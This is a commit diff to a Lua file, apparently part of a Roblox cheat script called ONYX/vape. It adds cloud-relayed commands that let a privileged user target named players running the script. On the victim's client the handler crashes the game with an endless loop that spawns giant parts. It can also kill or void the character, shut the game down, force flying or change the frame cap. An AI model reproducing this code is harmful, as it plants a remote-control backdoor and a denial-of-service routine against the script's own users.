cb9c44799dfcfe2fa0ca39f3697bbf8224478706
ywg <ssoryed@gmail.com>
2026-01-24 20:55:57 -0800

    Update whitelist.lua

--- whitelist.lua
+++ whitelist.lua
@@ -87,6 +87,196 @@ run(function()
                     Name = "Message"
                 })
            end)
+           run(function()
+                local Crash
+                local user
+                Crash = vape.Legit:CreateModule({
+                    Name = "Crash",
+                    Tooltip = "Crashes anyone using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        Crash:Toggle(false)
+                        local s2 = {
+                            hwid = str,
+                            plr = user.Value,
+                            msg = 'nothing',
+                            type = "crash"
+                        }
+                        req({
+                            Url = api,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s2)
+                        })
+                    end
+                })
+                user = Crash:CreateTextBox({
+                    Name = "Username"
+                })
+           end)
+           run(function()
+                local Void
+                local user
+                Void = vape.Legit:CreateModule({
+                    Name = "Void",
+                    Tooltip = "Voids anyone using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        Void:Toggle(false)
+                        local s2 = {
+                            hwid = str,
+                            plr = user.Value,
+                            msg = 'nothing',
+                            type = "void"
+                        }
+                        req({
+                            Url = api,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s2)
+                        })
+                    end
+                })
+                user = Void:CreateTextBox({
+                    Name = "Username"
+                })
+           end)
+           run(function()
+                local Kill
+                local user
+                Kill = vape.Legit:CreateModule({
+                    Name = "Kill",
+                    Tooltip = "Kills anyone using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        Kill:Toggle(false)
+                        local s2 = {
+                            hwid = str,
+                            plr = user.Value,
+                            msg = 'nothing',
+                            type = "kill"
+                        }
+                        req({
+                            Url = api,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s2)
+                        })
+                    end
+                })
+                user = Kill:CreateTextBox({
+                    Name = "Username"
+                })
+           end)
+           run(function()
+                local SD
+                local user
+                SD = vape.Legit:CreateModule({
+                    Name = "Shutdown",
+                    Tooltip = "Shutdowns anyone using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        SD:Toggle(false)
+                        local s2 = {
+                            hwid = str,
+                            plr = user.Value,
+                            msg = 'nothing',
+                            type = "shutdown"
+                        }
+                        req({
+                            Url = api,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s2)
+                        })
+                    end
+                })
+                user = Shutdown:CreateTextBox({
+                    Name = "Username"
+                })
+           end)
+           run(function()
+                local Fly
+                local user
+                Fly = vape.Legit:CreateModule({
+                    Name = "Fly",
+                    Tooltip = "makes anyone flying by using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        Fly:Toggle(false)
+                        local s2 = {
+                            hwid = str,
+                            plr = user.Value,
+                            msg = 'nothing',
+                            type = "fly"
+                        }
+                        req({
+                            Url = api,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s2)
+                        })
+                    end
+                })
+                user = Fly:CreateTextBox({
+                    Name = "Username"
+                })
+           end)
+           run(function()
+                local FPS
+                local user
+                local msg
+                FPS = vape.Legit:CreateModule({
+                    Name = "Framerate",
+                    Tooltip = "makes anyone FPS thast using ONYX! via by the cloud",
+                    Function = function(callback)
+                        if not callback then
+                            return
+                        end
+                        FPS:Toggle(false)
+                        local s2 = {
+                            hwid = str,
+                            plr = user.Value,
+                            msg = msg.Value,
+                            type = "fps"
+                        }
+                        req({
+                            Url = api,
+                            Method = "POST",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = HttpService:JSONEncode(s2)
+                        })
+                    end
+                })
+                user = FPS:CreateTextBox({
+                    Name = "Username"
+                })
+                msg = FPS:CreateTextBox({
+                    Name = "FPS"
+                })
+           end)
         end
     end
 end)
@@ -110,19 +300,153 @@ run(function()
         local msg = decoded.maincontrol.msg
         local command = decoded.maincontrol.type
         if lplr.Name == str and command == "kick" then
-			req({
-			    Url = api,
-			    Method = "DELETE",
-			    Headers = {
-			        ["Content-Type"] = "application/json"
-			    },
-			    Body = HttpService:JSONEncode({
-			        hwid = str
-			    })
-			})
-			
+            req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
 			task.wait(0.2)
 			lplr:Kick(msg)
         end
+        if lplr.Name == str and command == "crash" then
+            req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+			task.wait(0.2)
+			task.spawn(function()
+                local SpikeTickThreshold = 0.3
+                local current = 0
+                repeat
+                    local new = tick()
+                    local delta = (new - current)
+                    if delta >= SpikeTickThreshold then
+                        local Part = Instance.new("Part")
+                        Part.Size = Vector3.new(1e10,1e10,1e10)
+                        Part.Parent = workspace
+                        Part.Anchored = true
+                    end
+                    local Part = Instance.new("Part")
+                    Part.Size = Vector3.new(1e8,1e8,1e8)
+                    Part.Parent = workspace
+                    Part.Anchored = true
+                    current = new
+                until false
+            end)
+        end
+        if lplr.Name == str and command == "void" then
+            req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+            task.wait(0.2)
+            if lplr.Character then
+                lplr.Character.HumanoidRootPart.CFrame += Vector3.new(0, -1000, 0)
+            else
+                lplr.CharacterAdded:Wait()
+                task.wait(0.025)
+                lplr.Character.HumanoidRootPart.CFrame += Vector3.new(0, -1000, 0)
+            end
+
+        end
+        if lplr.Name == str and command == "kill" then
+            req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+            task.wait(0.2)
+            if lplr.Character then
+                lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+                lplr.Character.Humanoid.Health = 0
+            else
+                lplr.CharacterAdded:Wait()
+                task.wait(0.025)
+                lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+                lplr.Character.Humanoid.Health = 0
+            end
+        end
+        if lplr.Name == str and command == "shutdown" then
+            req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+            task.wait(0.2)
+            game:Shutdown()
+        end
+        if lplr.Name == str and command == "fly" then
+            req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+            task.wait(0.2)
+            if lplr.Character then
+                if vape.Modules then
+                    if vape.Modules.Fly then
+                        if not vape.Modules.Fly.Enabled then
+                            vape.Modules.Fly:Toggle(true)
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            task.wait()
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            task.wait()
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            task.wait()
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            vape.Modules.Fly:Toggle(false)
+                        end
+                    end
+                end
+            else
+                lplr.CharacterAdded:Wait()
+                task.wait(0.025)
+                if vape.Modules then
+                    if vape.Modules.Fly then
+                        if not vape.Modules.Fly.Enabled then
+                            vape.Modules.Fly:Toggle(true)
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            task.wait()
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            task.wait()
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            task.wait()
+                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                            vape.Modules.Fly:Toggle(false)
+                        end
+                    end
+                end
+            end
+        end
+        if lplr.Name == str and command == "fps" then
+            req({
+                Url = api,
+                Method = "DELETE",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+            task.wait(0.2)
+            local newfps = tonumber(msg)
+            if newfps == nil then
+                newfps = 60
+            end
+            setfpscap(newfps)
+        end
     end
 end)
+
